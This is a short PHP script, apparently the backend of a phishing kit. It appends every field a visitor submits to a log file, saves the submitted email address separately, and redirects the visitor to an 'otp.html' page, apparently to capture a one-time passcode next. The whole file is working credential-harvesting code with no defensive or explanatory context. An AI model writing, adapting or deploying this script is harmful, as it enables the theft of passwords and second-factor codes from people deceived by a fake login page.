<?php
$handle = fopen("log.txt", "a");
foreach($_POST as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n\n");
fclose($handle);

if (isset($_POST['email'])) {
	$ef = fopen("email.txt", "w");
	fwrite($ef, $_POST['email']);
	fclose($ef);
}

header("Location: otp.html");
exit;
?>
